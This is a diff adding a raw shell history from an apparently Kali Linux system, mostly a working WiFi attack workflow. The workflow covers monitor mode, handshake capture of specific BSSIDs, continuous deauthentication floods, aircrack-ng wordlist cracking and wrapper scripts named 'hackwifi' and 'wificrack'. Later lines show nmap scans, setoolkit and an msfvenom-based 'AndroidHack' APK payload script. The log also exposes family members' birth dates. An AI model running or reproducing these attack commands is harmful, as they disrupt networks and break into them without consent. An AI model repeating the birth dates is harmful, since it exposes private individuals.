@@ -1,0 +1,1000 @@
+  999  ls -n
+ 1000  chmod +x hscript.sh 
+ 1001  ls -n
+ 1002  nano hscript.sh 
+ 1003  cd 
+ 1004  nano /root/.bashrc
+ 1005  nano /home/script/hscript.sh 
+ 1006  figlet "Wifi Hack"
+ 1007  figlet "Wifi Hacking"
+ 1008  exit
+ 1009  hs
+ 1010  l
+ 1011  websploit
+ 1012  cd sc
+ 1013  cd script
+ 1014  dir
+ 1015  touch wifihack.sh
+ 1016  nano wifihack.sh 
+ 1017  ls
+ 1018  hwifif
+ 1019  hwifi
+ 1020  hs
+ 1021  wifi
+ 1022  cd
+ 1023  wifi
+ 1024  ls -n
+ 1025  cd script
+ 1026  ls -n
+ 1027  chmod +x wifihack.sh 
+ 1028  wifi
+ 1029  hs
+ 1030  clear
+ 1031  hs
+ 1032  clear
+ 1033  hs
+ 1034  cd home
+ 1035  dir
+ 1036  ls
+ 1037  cd script/
+ 1038  dir
+ 1039  chmod +x wifihack.sh 
+ 1040  nano /root/.bashrc
+ 1041  wifihack
+ 1042  nano /root/.bashrc
+ 1043  wifi
+ 1044  hs
+ 1045  nano wifihack.sh 
+ 1046  wifi
+ 1047  ls
+ 1048  cat wlan0mon.sh 
+ 1049  ls
+ 1050  hs
+ 1051  nano hscript.sh
+ 1052  nano /root/.bashrc
+ 1053  cd script
+ 1054  dir
+ 1055  ls
+ 1056  mkdir wificrack
+ 1057  ls
+ 1058  cd wificrack/
+ 1059  dir
+ 1060  touch wlan0mon.sh
+ 1061  touch airodump-ng-wlan0mon.sh
+ 1062  touch airodump-ng-capture.sh
+ 1063  touch airmon-ng-stop.sh
+ 1064  ls
+ 1065  mkdir caps
+ 1066  ls
+ 1067  mv caps cap
+ 1068  lsl
+ 1069  ls
+ 1070  aireplay -0 0 -a 12:FA:CE:91:1D:88 wlan0mon
+ 1071  aireplay-ng -0 0 -a 12:FA:CE:91:1D:88 wlan0mon
+ 1072  clear
+ 1073  ls
+ 1074  cd cap/
+ 1075  dir
+ 1076  cd..
+ 1077  cd ..
+ 1078  diri
+ 1079  ls
+ 1080  touch aireplay-ng.sh
+ 1081  ls
+ 1082  aireplay-ng.sh
+ 1083  nano aireplay-ng.sh 
+ 1084  ls
+ 1085  nano airodump-ng-capture.sh 
+ 1086  ls
+ 1087  nano airodump-ng-capture.sh 
+ 1088  sh airodump-ng-caputure.sh
+ 1089  ls
+ 1090  nano airodump-ng-capture.sh 
+ 1091  sh airodump-ng-capture.sh
+ 1092  nano airodump-ng-capture.sh 
+ 1093  clear
+ 1094  sh airodump-ng-capture.sh
+ 1095  cd script
+ 1096  dir
+ 1097  wifif
+ 1098  wifi
+ 1099  nano wifihack.sh 
+ 1100  cd wificrack/
+ 1101  dir
+ 1102  nano airodump-ng-capture.sh 
+ 1103  chmod +x airodump-ng-capture.sh 
+ 1104  ls
+ 1105  sh airodump-ng-capture.sh 
+ 1106  nano airodump-ng-capture.sh 
+ 1107  sh airodump-ng-capture.sh 
+ 1108  cd cap
+ 1109  dir
+ 1110  rm *.*
+ 1111  diir
+ 1112  dir
+ 1113  ls
+ 1114  cd ..
+ 1115  chmod +x aireplay-ng.sh 
+ 1116  nano aireplay-ng.sh 
+ 1117  iwconfi
+ 1118  iwconfig
+ 1119  airmon-ng start wlan0
+ 1120  airodump-ng wlan0mon
+ 1121  mkdir capture
+ 1122  airodump-ng --bssid 40:C8:CB:19:0F:07 -c 6 --write /root/capture/cap-wpa wlan0mon
+ 1123  airmon-ng stop 
+ 1124  airmon-ng stop wlan0
+ 1125  ifconfig
+ 1126  airodump-ng stop
+ 1127  airodump-ng stop wlan0moon
+ 1128  airodump-ng stop wlan0mon
+ 1129  airmon-ng stop wlan0mon
+ 1130  iwconfig
+ 1131  iwconfig
+ 1132  airodump-ng wlan0mon
+ 1133  aireplay-ng -0 0 -a 40:C8:CB:19:0F:07 wlan0mon
+ 1134  cd script
+ 1135  dir
+ 1136  sh wifi
+ 1137  sh wifihack.sh 
+ 1138  aircrack -w /home/wordlist/password.txt -b 40:C8:CB:19:0F:07 /root/capture/cap-wpa-01.cap 
+ 1139  aircrack-ng -w /home/wordlist/password.txt -b 40:C8:CB:19:0F:07 /root/capture/cap-wpa-01.cap 
+ 1140  aireplay-ng -0 0 -a 40:C8:CB:19:0F:07 wlan0mon
+ 1141  cd capture/
+ 1142  dir
+ 1143  rm *.*
+ 1144  dir
+ 1145  exit
+ 1146  airodump-ng stop wlan0mon
+ 1147  airmon-ng stop wlan0mon
+ 1148  airmon-ng start wlan0
+ 1149  airmon-ng check kill
+ 1150  airodump-ng --bssid 12:FA:CE:91:1D:88 -c 6 --write /root/capture/cap-wpa wlan0mon
+ 1151  airodump-ng wlan0mon
+ 1152  aireplay -0 0 -a 12:FA:CE:91:1D:88 wlan0mon
+ 1153  aireplay-ng -0 0 -a 12:FA:CE:91:1D:88 wlan0mon
+ 1154  aireplay-ng -0 0 -a 12:FA:CE:91:1D:88 -c 6 wlan0mon
+ 1155  aireplay-ng -0 0 -a 12:FA:CE:91:1D:88  wlan0mon
+ 1156  nano /root/.bashrc
+ 1157  jiofi
+ 1158  nano /root/.bashrc
+ 1159  cd script
+ 1160  dir
+ 1161  ls
+ 1162  cd capture/
+ 1163  dir
+ 1164  ls
+ 1165  rm *.*
+ 1166  airodump-ng --bssid 40:C8:CB:19:0F:07 -c 7 --write /root/capture/cap-wpa wlan0mon
+ 1167  aireplay-ng -0 0 -a 40:C8:CB:19:0F:07 wlan0mon
+ 1168  aireplay --deauth 10 -a 40:C8:CB:19:0F:07
+ 1169  aireplay-ng --deauth 10 -a 40:C8:CB:19:0F:07 wlan0mon
+ 1170  aireplay-ng --deauth 0 -a 40:C8:CB:19:0F:07 wlan0mon
+ 1171  ifconfig
+ 1172  airodump-ng wlan0mon
+ 1173  cd home
+ 1174  dir
+ 1175  cd wordlist/
+ 1176  dir
+ 1177  exit
+ 1178  nano script/wificrack/airodump-ng-capture.sh 
+ 1179  exit
+ 1180  sh script/wificrack/aircrack-ng.sh 
+ 1181  nano script/wificrack/aircrack-ng.sh 
+ 1182  sh script/wificrack/aircrack-ng.sh 
+ 1183  nano script/wificrack/aircrack-ng.sh 
+ 1184  sh script/wificrack/aircrack-ng.sh 
+ 1185  cd script
+ 1186  dir
+ 1187  ls
+ 1188  nano wifihack.sh 
+ 1189  cd wificrack/
+ 1190  dir
+ 1191  nano aireplay-ng.sh 
+ 1192  nano airodump-ng-capture.sh 
+ 1193  ls
+ 1194  nano airodump-ng-wlan0mon.sh 
+ 1195  nano airodump-ng-capture.sh 
+ 1196  cd cap/
+ 1197  dir
+ 1198  echo "40:C8:CB:19:0F:07" > bssid
+ 1199  ls
+ 1200  cat bssid 
+ 1201  aireplay -0 0 -a bssid wlan0mon
+ 1202  aireplay-ng -0 0 -a bssid wlan0mon
+ 1203  aireplay-ng -0 0 -a cat bssid wlan0mon
+ 1204  cd ..
+ 1205  ls
+ 1206  aireplay-ng 
+ 1207  nano airodump-ng-capture.sh 
+ 1208  lsl
+ 1209  ls
+ 1210  touch aircrack-ng.sh
+ 1211  chmod +x aircrack-ng.sh 
+ 1212  nano aircrack-ng.sh 
+ 1213  ls
+ 1214  xterm echo "hi"
+ 1215  clear
+ 1216  sh airodump-ng-capture.sh 
+ 1217  nano airodump-ng-capture.sh 
+ 1218  sh airodump-ng-capture.sh 
+ 1219  sh script/wificrack/aireplay-ng.sh 
+ 1220  airodump-ng --bssid 40:C8:CB:19:0F:07 -c 7 --write /root/capture/cap-wpa wlan0mon
+ 1221  mountall
+ 1222  cd capture/
+ 1223  dir
+ 1224  cat cap-wpa-01.kismet.netxml 
+ 1225  rm *.*
+ 1226  airmon-ng start wlan0
+ 1227  airodump-ng wlan0mon
+ 1228  aireplay-ng -0 0 -a 40:C8:CB:19:0F:07 wlan0mon
+ 1229  cat keyfound.txt 
+ 1230  exit
+ 1231  cd ..
+ 1232  sh aircrack-ng.sh 
+ 1233  sh airodump-ng-wlan0mon.sh 
+ 1234  sh airodump-ng-capture.sh 
+ 1235  cd script/wificrack/
+ 1236  ls
+ 1237  sh aircrack-ng.sh 
+ 1238  cd world/
+ 1239  dir
+ 1240  cat keyfound.txt 
+ 1241  cd ..
+ 1242  nano wifihack.sh 
+ 1243  aircrack-ng -w /home/wordlist/password.txt -b 40:C8:CB:19:0F:07 /root/capture/cap-wpa-01.cap wlan0mon
+ 1244  aircrack-ng -w /home/wordlist/password.txt -b 40:C8:CB:19:0F:07 /root/capture/cap-wpa-01.cap
+ 1245  aircrack-ng -w /home/wordlist/password.txt -b 40:C8:CB:19:0F:07 /root/capture/cap-wpa-01.cap > cracked.txt
+ 1246  cat cracked.txt 
+ 1247  cd script
+ 1248  cd wificrack/
+ 1249  sh airodump-ng-wlan0mon.sh 
+ 1250  cd capture/
+ 1251  dir
+ 1252  sh wificrack/aircrack-ng.sh 
+ 1253  ln -s /home/script/wificrack/
+ 1254  cd wificrack
+ 1255  sh airodump-ng-wlan0mon.sh 
+ 1256  sh airodump-ng-capture.sh 
+ 1257  sh wificrack/aireplay-ng.sh 
+ 1258  exit
+ 1259  figlet "airmon-ng start wlan0"
+ 1260  figlet "Monitor Mode"
+ 1261  figlet "Monitor Mode:ON"
+ 1262  figlet "MonitorMode:ON"
+ 1263  figlet "MonitorMode"
+ 1264  figlet "Monitor Mode"
+ 1265  figlet "wifi crack
+ 1266  figlet "wifi crack"
+ 1267  figlet "wifi handshake"
+ 1268  figlet "wifihandshake"
+ 1269  figlet "wifi capture"
+ 1270  figlet "wifiHandshake"
+ 1271  figlet "wifi crack"
+ 1272  figlet "wifi monitor"
+ 1273  figlet "capturing
+ 1274  figlet "capturing"]
+ 1275  figlet "capturing"
+ 1276  figlet "capturing wifi"
+ 1277  echo "airodump-ng --bssid $(tput setaf 1) (bssid) -c $(tput setaf 1) (channel) --write $(tput setaf 1) (cap-dir) $(tput setaf 2) wlan0mon"
+ 1278  echo "airodump-ng --bssid $(tput setaf 1) (bssid) $(tput setaf 7) -c $(tput setaf 1) (channel) $(tput setaf 7) --write $(tput setaf 1) (cap-dir) $(tp$
+ 1279  echo "airodump-ng --bssid $(tput setaf 1) (bssid) $(tput setaf 7) -c $(tput setaf 1) (channel) $(tput setaf 7) --write $(tput setaf 1) (cap-dir) 
+ 1280  echo "airodump-ng --bssid $(tput setaf 1) (bssid) $(tput setaf 7) -c $(tput setaf 1) (channel) $(tput setaf 7) --write $(tput setaf 1) (cap-dir) "
+ 1281  echo "airodump-ng --bssid $(tput setaf 1) (bssid) $(tput setaf 7) -c $(tput setaf 1) (channel) $(tput setaf 7) --write $(tput setaf 1) (cap-dir) $(tput setaf 2) wlan0mon "
+ 1282  exit
+ 1283  cd home
+ 1284  cd wordlist/
+ 1285  less password.txt 
+ 1286  cd ..
+ 1287  cd script/wificrack/
+ 1288  sh aireplay-ng.sh 
+ 1289  figlet "hack wifi"
+ 1290  exit
+ 1291  figlet "hacking wifi
+ 1292  figlet "hacking wifi"
+ 1293  exit
+ 1294  showfigfonts
+ 1295  figlet -f digital "wifimonitor" && echo "wifi "
+ 1296  exit
+ 1297  figlete -f digital "wifi monitor . sh"
+ 1298  figlete -f" digital "wifi monitor . sh"
+ 1299  figlete -f " digital "wifi monitor . sh"
+ 1300  figlete -f digital "wifi monitor . sh"
+ 1301  figlet -f digital "wifi monitor . sh"
+ 1302  exit
+ 1303  cd script/txt/
+ 1304  didr
+ 1305  dir
+ 1306  touch hackwifi
+ 1307  nano hackwifi 
+ 1308  mv hackwifi hackwifi.sh
+ 1309  nano hackwifi.sh 
+ 1310  ls
+ 1311  chmod +x hackwifi.sh 
+ 1312  sh hackwifi.sh 
+ 1313  nano hackwifi.sh 
+ 1314  sh hackwifi.sh 
+ 1315  nano hackwifi.sh 
+ 1316  sh hackwifi.sh 
+ 1317  nano hackwifi.sh 
+ 1318  sh hackwifi.sh 
+ 1319  nano hackwifi.sh 
+ 1320  sh hackwifi.sh 
+ 1321  sh hackwifi.sh
+ 1322  nano hackwifi.sh 
+ 1323  sh hackwifi.sh
+ 1324  nano hackwifi.sh 
+ 1325  sh hackwifi.sh
+ 1326  wifimonitor
+ 1327  hackwifi
+ 1328  cd ..
+ 1329  cd wificrack/
+ 1330  rm hackwifi.sh 
+ 1331  cd ..
+ 1332  cd txt/
+ 1333  mv hackwifi.sh /home/script/wificrack/
+ 1334  cd ..
+ 1335  cd wificrack/
+ 1336  ls
+ 1337  sh hackwifi.sh 
+ 1338  hackwifi
+ 1339  nano hackwifi.sh 
+ 1340  hackwifi
+ 1341  nano /root/.bashrc
+ 1342  figlet -f digital "wifi handshare"
+ 1343  figlet -f digital "wifi crack"
+ 1344  figlet -f digital "wifi handshake"
+ 1345  figlet -f mini "alias"
+ 1346  figlet -f digital "alias"
+ 1347  cd script/wificrack/
+ 1348  nano wifimonitor.sh 
+ 1349  nano wificapture.sh 
+ 1350  nano wifihandshake.sh 
+ 1351  nano wificrack.sh 
+ 1352  cd ..
+ 1353  sh colorTEXT.sh 
+ 1354  cd script
+ 1355  cd wificrack/
+ 1356  dir
+ 1357  ls
+ 1358  cat wifimonitor.sh 
+ 1359  chmod +x monitormode.sh 
+ 1360  ls
+ 1361  cat monitormode.sh 
+ 1362  touch hackwifi.sh
+ 1363  chmod +x hackwifi.sh 
+ 1364  nano hackwifi.sh 
+ 1365  lss
+ 1366  ls
+ 1367  sh hackwifi.sh 
+ 1368  ls
+ 1369  nano hackwifi.sh 
+ 1370  sh hackwifi.sh 
+ 1371  nano hackwifi.sh 
+ 1372  sh hackwifi.sh 
+ 1373  nano hackwifi.sh 
+ 1374  sh hackwifi.sh 
+ 1375  nano hackwifi.sh 
+ 1376  sh hackwifi.sh 
+ 1377  nano hackwifi.sh 
+ 1378  sh hackwifi.sh 
+ 1379  figlet -f mini "wifi monitor"
+ 1380  cd script/wificrack/
+ 1381  nano hackwifi.sh 
+ 1382  cd script
+ 1383  sh colorTEXT.sh 
+ 1384  cd wificrack
+ 1385  dir
+ 1386  ls
+ 1387  mv airodump-ng-capture.sh wificapture.sh
+ 1388  ls
+ 1389  mv aircrack-ng.sh wificrack.sh
+ 1390  ls
+ 1391  mv aireplay-ng.sh wifihandshake.sh
+ 1392  ls
+ 1393  mv airodump-ng-wlan0mon.sh wifimonitor.sh
+ 1394  ls
+ 1395  cat wlan0mon.sh 
+ 1396  cat wifimonitor.sh 
+ 1397  mv wlan0mon.sh monitormode.sh
+ 1398  cat monitormode.sh 
+ 1399  nano monitormode.sh 
+ 1400  ls
+ 1401  chmod +x wifimonitor.sh 
+ 1402  ls
+ 1403  nano wifihandshake.sh 
+ 1404  nano wificrack.sh 
+ 1405  nano wificapture.sh 
+ 1406  nano wifimonitor.sh 
+ 1407  nano wificapture.sh 
+ 1408  sh wificapture.sh 
+ 1409  nano wificapture.sh 
+ 1410  sh wificapture.sh 
+ 1411  nano wificapture.sh 
+ 1412  sh wificapture.sh 
+ 1413  nano wificapture.sh 
+ 1414  sh wificapture.sh 
+ 1415  sh wifihandshake.sh 
+ 1416  nano wificapture.sh 
+ 1417  sh wificapture.sh 
+ 1418  nano wificapture.sh 
+ 1419  sh wificapture.sh 
+ 1420  nano wificapture.sh 
+ 1421  sh wificapture.sh 
+ 1422  nano wificapture.sh 
+ 1423  sh wificapture.sh 
+ 1424  nano wificapture.sh 
+ 1425  sh wificapture.sh 
+ 1426  nano wificapture.sh 
+ 1427  sh wificapture.sh 
+ 1428  nano wificapture.sh 
+ 1429  sh wificapture.sh 
+ 1430  nano wificapture.sh 
+ 1431  sh wificapture.sh 
+ 1432  nano wificapture.sh 
+ 1433  lss
+ 1434  ls
+ 1435  sh wificrack.sh 
+ 1436  nano wificrack.sh 
+ 1437  sh wificrack.sh 
+ 1438  nano wificrack.sh 
+ 1439  sh wificrack.sh 
+ 1440  nano wificrack.sh 
+ 1441  sh wificrack.sh 
+ 1442  ls
+ 1443  sh wifihandshake.sh 
+ 1444  nano wifihandshake.sh 
+ 1445  nano wificapture.sh 
+ 1446  sh wificapture.sh 
+ 1447  nano wificapture.sh 
+ 1448  echo "airodump-ng --bssid $(tput setaf 1) (bssid) $(tput setaf 7) -c $(tput setaf 1) (channel) $(tput setaf 7) --write $(tput setaf 1) (cap-dir) 
+ 1449  $(tput setaf 2) wlan0mon"echo "airodump-ng --bssid $(tput setaf 1) (bssid) $(tput setaf 7) -c $(tput setaf 1) (channel) $(tput setaf 7) --write $(tput setaf 1) (cap-dir) 
+ 1450  cd script
+ 1451  sh colorTEXT.sh 
+ 1452  nano colorTEXT.sh 
+ 1453  sh colorTEXT.sh 
+ 1454  nano colorTEXT.sh 
+ 1455  sh colorTEXT.sh 
+ 1456  nano colorTEXT.sh 
+ 1457  sh colorTEXT.sh 
+ 1458  nano colorTEXT.sh 
+ 1459  sh colorTEXT.sh 
+ 1460  nano colorTEXT.sh 
+ 1461  sh colorTEXT.sh 
+ 1462  nano colorTEXT.sh 
+ 1463  sh colorTEXT.sh 
+ 1464  hackwifi
+ 1465  ln -s /home/wordlist/password.txt  /root/
+ 1466  ls
+ 1467  ls -n
+ 1468  cat password.txt 
+ 1469  wificapture
+ 1470  wificapture
+ 1471  nano wificrack/wificapture.sh
+ 1472  wificapture
+ 1473  cd wificrack
+ 1474  ls
+ 1475  cad cap/
+ 1476  cd cap/
+ 1477  dir
+ 1478  cd..
+ 1479  cd ..
+ 1480  ls
+ 1481  cd hello
+ 1482  lss
+ 1483  ls
+ 1484  clear
+ 1485  wificapture
+ 1486  cd .
+ 1487  cd ...
+ 1488  cd ..
+ 1489  lsl
+ 1490  ls
+ 1491  mv cap capture
+ 1492  ls
+ 1493  rm -r hello
+ 1494  rm -r helloworld/
+ 1495  rm -r world/
+ 1496  ls
+ 1497  rm -r fd
+ 1498  ls
+ 1499  nano wificrack/wificapture.sh
+ 1500  cd wificrack
+ 1501  l
+ 1502  ls
+ 1503  wificapture
+ 1504  nano wificrack/wificapture.sh
+ 1505  nano /root/.bashrc
+ 1506  wifihandshake
+ 1507  wificapture
+ 1508  clear
+ 1509  wificap
+ 1510  iwconfi
+ 1511  iwconfig
+ 1512  wifimonitor
+ 1513  wificrack
+ 1514  jiofi
+ 1515  wificrack
+ 1516  nano wificrack/wificrack.sh 
+ 1517  mountall
+ 1518  airmon-ng start wlan0
+ 1519  wifimonitor
+ 1520  hackwifi
+ 1521  wificap
+ 1522  wifihshake
+ 1523  wifihshak40:C8:CB:19:0F:07
+ 1524  wifihshake
+ 1525  wifimonitor
+ 1526  wificrack
+ 1527  wificapture
+ 1528  wificap
+ 1529  cd wificrack/capture/hworld/
+ 1530  ls
+ 1531  cat keyfound.txt 
+ 1532  cd ..
+ 1533  dir
+ 1534  cd ..
+ 1535  dir
+ 1536  cd capture/
+ 1537  dir
+ 1538  cd helloworld/
+ 1539  ls
+ 1540  cat keyfound.txt 
+ 1541  wificrack
+ 1542  airmon-ng stop wlan0mon
+ 1543  ifconfig
+ 1544  eixt
+ 1545  route -a
+ 1546  route -n
+ 1547  nmap -T4 -vv -A 192.168.43.1
+ 1548  netdiscover
+ 1549  wifimonitor
+ 1550  nmap -T4 -vv -A 192.168.43.67
+ 1551  cd wificrack/capture/hworld/
+ 1552  ls
+ 1553  cat keyfound.txt 
+ 1554  cd wificrack
+ 1555  dir
+ 1556  ls
+ 1557  hackwifif
+ 1558  hackwifi
+ 1559  cat hackwifi.sh 
+ 1560  nano hackwifi.sh 
+ 1561  ls
+ 1562  cat wificapture.sh
+ 1563  nano wifimonitor.sh 
+ 1564  nano wificapture.sh
+ 1565  ifconfig
+ 1566  airmon-ng start wlan0
+ 1567  wifite
+ 1568  wifihshake
+ 1569  wificap
+ 1570  wifihshake
+ 1571  wificap
+ 1572  wifihshake
+ 1573  aireplay-ng -0 0 -a 40:C8:CB:19:0F:07  -c 8 wlan0mon
+ 1574  aireplay-ng -0 0 -a 40:C8:CB:19:0F:07 -c 8 wlan0mon
+ 1575  aireplay-ng -0 0 -a 40:C8:CB:19:0F:07  wlan0mon
+ 1576  aireplay-ng -0 0 -a 40:C8:CB:19:0F:07 -c 8 wlan0mon
+ 1577  aireplay-ng -0 0 -a 40:C8:CB:19:0F:07  wlan0mon
+ 1578  aireplay-ng -0 0 -a 40:C8:CB:19:0F:07 -c 8 wlan0mon
+ 1579  aireplay-ng -0 0 -a 40:C8:CB:19:0F:07  wlan0mon
+ 1580  airmon-ng check kill
+ 1581  wifite
+ 1582  airmon-ng stop wlan0
+ 1583  airmon-ng stop wlan0mon
+ 1584  ifconfig
+ 1585  ifconfig wlan0 up
+ 1586  ifconfig
+ 1587  iwconfig
+ 1588  mountall
+ 1589  wificrack
+ 1590  ifconfig
+ 1591  airmon-ng start wlan0
+ 1592  wifimonitor
+ 1593  hackwifi
+ 1594  clear
+ 1595  wificap
+ 1596  wifihshake
+ 1597  exit
+ 1598  nano wificrack/hackwifi.sh 
+ 1599  hackwifi
+ 1600  nano wificrack/hackwifi.sh 
+ 1601  hackwifi
+ 1602  nano wificrack/hackwifi.sh 
+ 1603  hackwifi
+ 1604  nano wificrack/hackwifi.sh 
+ 1605  hackwifi
+ 1606  nano wificrack/hackwifi.sh 
+ 1607  hackwifi
+ 1608  nano wificrack/hackwifi.sh 
+ 1609  hackwifi
+ 1610  nano wificrack/hackwifi.sh 
+ 1611  hackwifi
+ 1612  nano wificrack/hackwifi.sh 
+ 1613  hackwifi
+ 1614  nano wificrack/hackwifi.sh 
+ 1615  hackwifi
+ 1616  nano wificrack/hackwifi.sh 
+ 1617  cd wificrack
+ 1618  ls
+ 1619  cd ..
+ 1620  cd script
+ 1621  ls
+ 1622  cd wificrack/
+ 1623  ls
+ 1624  touch wifi
+ 1625  mv wifi hwifi
+ 1626  nano hwifi 
+ 1627  nano hackwifi.sh 
+ 1628  hackwifi
+ 1629  nano hackwifi.sh 
+ 1630  wifite
+ 1631  wificrack
+ 1632  wificap
+ 1633  hackwifi
+ 1634  nano wificrack/hackwifi.sh 
+ 1635  hackwifi
+ 1636  cd wifi
+ 1637  cd wificrack
+ 1638  ls
+ 1639  cat hwifi 
+ 1640  nano hackwifi.sh 
+ 1641  cat hwifi 
+ 1642  hackwifi
+ 1643  nano hwifi 
+ 1644  hackwifi
+ 1645  nano hwifi 
+ 1646  hackwifi
+ 1647  nano hwifi 
+ 1648  hackwifi
+ 1649  airmon-ng stop wlan0mon
+ 1650  ifconfig
+ 1651  cler
+ 1652  clear
+ 1653  adb devices
+ 1654  cd /media/root/
+ 1655  dir
+ 1656  cd GhostDrive/
+ 1657  dir
+ 1658  cd StephanWarePC/
+ 1659  cd App-Source-codes/
+ 1660  cd ..
+ 1661  ls
+ 1662  dir
+ 1663  cd APK
+ 1664  lsl
+ 1665  ls
+ 1666  dir | grep jio
+ 1667  adb devices
+ 1668  adb install com.jio.myjio-1.apk 
+ 1669  adb shel
+ 1670  adb shell
+ 1671  adb devices
+ 1672  adb shell
+ 1673  cd /media/root/GhostDrive/StephanWarePC/APK/
+ 1674  LS
+ 1675  dir | grep jio
+ 1676  adb push com.jio.myjio-1.apk /storage/self/primary/Apps
+ 1677  adb push com.jio.join-1.apk /storage/self/primary/Apps
+ 1678  adb shell installcom.jio.myjio-1.apk
+ 1679  adb install com.jio.myjio-1.apk 
+ 1680  ls
+ 1681  adb push WhatsApp-com.whatsapp-2.17.190-451818.apk /storage/self/primary/Apps 
+ 1682  mountall
+ 1683  cd /home/wordlist/
+ 1684  ls
+ 1685  less password.txt 
+ 1686  cat password.txt 
+ 1687  echo "password" >> password.txt 
+ 1688  cat password.txt 
+ 1689  aircrack
+ 1690  wificrack
+ 1691  ls
+ 1692  nano password.txt 
+ 1693  wificrack
+ 1694  wificrack
+ 1695  hackwifi
+ 1696  airmon-ng start wlan0
+ 1697  wifimonitor
+ 1698  wificap
+ 1699  wifihshake
+ 1700  ls -n
+ 1701  ln -s /home/wificrack/capture /root
+ 1702  ls
+ 1703  ls -n
+ 1704  ln -s /home/script/wificrack/capture/ /root/
+ 1705  rm capture
+ 1706  ls
+ 1707  ls -n
+ 1708  ln -s /home/script/wificrack/capture/ /root/
+ 1709  ls
+ 1710  cd capture
+ 1711  ls
+ 1712  rm *.*
+ 1713  ls
+ 1714  rm bssid
+ 1715  ls
+ 1716  cd redmi/
+ 1717  ls
+ 1718  cat keyfound.txt 
+ 1719  cd ..
+ 1720  cd Redmi/
+ 1721  ls
+ 1722  cat keyfound.txt 
+ 1723  cd ..
+ 1724  cd helloworld/
+ 1725  ls
+ 1726  cat keyfound.txt 
+ 1727  cd ..
+ 1728  ls
+ 1729  wificrack
+ 1730  wifimonitor
+ 1731  airmon-ng stop wlan0
+ 1732  airmon-ng stop wlan0mon
+ 1733  ifconfig
+ 1734  ifconfig wlan0 up
+ 1735  ifconfig
+ 1736  cd capture/redmi/
+ 1737  cat keyfound.txt 
+ 1738  wifihshake
+ 1739  wificap
+ 1740  mountall
+ 1741  cd capture/redmi/
+ 1742  cat keyfound.txt 
+ 1743  cd Downloads/
+ 1744  lsls
+ 1745  ls
+ 1746  adb devices
+ 1747  adb shell
+ 1748  cd /home/
+ 1749  ls
+ 1750  mkdir personal
+ 1751  cd personal/
+ 1752  touch mydob
+ 1753  echo "Father's DOB-7 April 1961"> mydob
+ 1754  ls
+ 1755  cat mydob 
+ 1756  echo "Mother's DOB - 11 June 1970" > mydob 
+ 1757  echo "Father's DOB-7 April 1961" >> mydob 
+ 1758  cat mydob 
+ 1759  echo "Sanju's DOB - 18 June 1997 " >> mydob 
+ 1760  cat mydob 
+ 1761  wifiadb
+ 1762  adb shell
+ 1763  xdg-open /Stephanware/videos/music/Charlie_Puth_-_Does_It_Feel_\[Official_Audio\].mp4 
+ 1764  l
+ 1765  hackwifi
+ 1766  nano wificrack/wificapture.sh
+ 1767  ls
+ 1768  ls -n
+ 1769  xdg-open /root/.set/reports/qrcode_attack.png
+ 1770  setoolkit
+ 1771  ifconfig
+ 1772  ls
+ 1773  ifconfig
+ 1774  systemctl restart apache2.service
+ 1775  cd script
+ 1776  ls
+ 1777  mkdir apache2
+ 1778  cd apache2/
+ 1779  cd ..
+ 1780  cat start-server.sh 
+ 1781  mv start-server.sh apache2/
+ 1782  cd apache2/
+ 1783  ls
+ 1784  nano /root/wificrack/wificapture.sh
+ 1785  cd html
+ 1786  ls
+ 1787  cat index.html
+ 1788  eix
+ 1789  exi
+ 1790  exit
+ 1791  sh SuperUser@10.42.0.1
+ 1792  ssh SuperUser@10.42.0.1
+ 1793  ifconfig
+ 1794  ping 10.42.0.1
+ 1795  nmap -T4 -vv -A 10.42.0.1
+ 1796  figlet "Kali Linux "
+ 1797  figlet "Videos"
+ 1798  touch index.html
+ 1799  touch webserver.sh
+ 1800  exit
+ 1801  figlet "webserver"
+ 1802  nano webserver.sh 
+ 1803  chmod +x webserver.sh 
+ 1804  sh webserver.sh 
+ 1805  exit
+ 1806  nano webserver.sh 
+ 1807  netstat -nap | grep apache2 | more
+ 1808  cd /media/root/Stephanware/
+ 1809  echo "netstat -nap | grep apache2 | more " >> webserver.sh 
+ 1810  nano webserver.sh 
+ 1811  sh webserver.sh 
+ 1812  nano webserver.sh 
+ 1813  sh webserver.sh 
+ 1814  nano webserver.sh 
+ 1815  sh webserver.sh 
+ 1816  ifconfig
+ 1817  ifconfig | grep wlan0
+ 1818  ifconfig | grep wlan0 | grep inet
+ 1819  ifconfig | grep wlan0 && grep inet
+ 1820  ifconfig |  grep inet
+ 1821  ifconfig eth0 down
+ 1822  ifconfig lo down
+ 1823  ifconfig |  grep inet
+ 1824  nano webserver.sh 
+ 1825  sh we
+ 1826  sh webserver.sh 
+ 1827  ifconfig
+ 1828  sh webserver.sh 
+ 1829  nano webserver.sh 
+ 1830  sh webserver.sh 
+ 1831  nano webserver.sh 
+ 1832  sh webserver.sh 
+ 1833  nano webserver.sh 
+ 1834  cd home
+ 1835  cd python/
+ 1836  ls
+ 1837  cd PythonProjects/
+ 1838  ls
+ 1839  py helloworld.py 
+ 1840  chmod +x helloworld.py 
+ 1841  ./helloworld.py 
+ 1842  cd localhost
+ 1843  ls -n
+ 1844  bluefish index.html
+ 1845  cd /media/root/
+ 1846  di
+ 1847  lsl
+ 1848  ls
+ 1849  eix
+ 1850  eixt
+ 1851  hackwifi
+ 1852  ls -n
+ 1853  mountall
+ 1854  ifconfifg
+ 1855  ifconfig
+ 1856  arimon-ng start wlan0
+ 1857  airmon-ng start wlan0
+ 1858  airmon-ng wlan0
+ 1859  airodump-ng wlan0mon
+ 1860  cd /home/
+ 1861  ls
+ 1862  mv payloads payload
+ 1863  ls
+ 1864  exit
+ 1865  figlet "msfvenom"
+ 1866  figlet "msfvenom apk"
+ 1867  figlet "msfvenom"
+ 1868  figlet "venom apk"
+ 1869  figlet "venom.apk
+ 1870  figlet "venom.apk"
+ 1871  figlet "venom . apk"
+ 1872  figlet "venom.apk"
+ 1873  figlet "venom . apk" 
+ 1874  figlet "venom. apk" 
+ 1875  figlet "venom..apk" 
+ 1876  ifconfig
+ 1877  figlet "AndroidHack" >> apk/AndroidHack.txt 
+ 1878  cat apk/AndroidHack.txt 
+ 1879  sh apk/venom.sh
+ 1880  cd apk
+ 1881  ls -n
+ 1882  cd apk
+ 1883  rm apk
+ 1884  l
+ 1885  ln -s /home/payload/apk
+ 1886  ls -n
+ 1887  cd apk/
+ 1888  ls -n
+ 1889  cd 
+ 1890  sh apk/venom.sh 
+ 1891  cd apk
+ 1892  ls
+ 1893  cat AndroidHack.txt 
+ 1894  nano venom.sh 
+ 1895  sh venom.sh 
+ 1896  nano venom.sh 
+ 1897  sh venom.sh 
+ 1898  leafpad HackAndroid.txt 
+ 1899  ls -n
+ 1900  rm *.txt
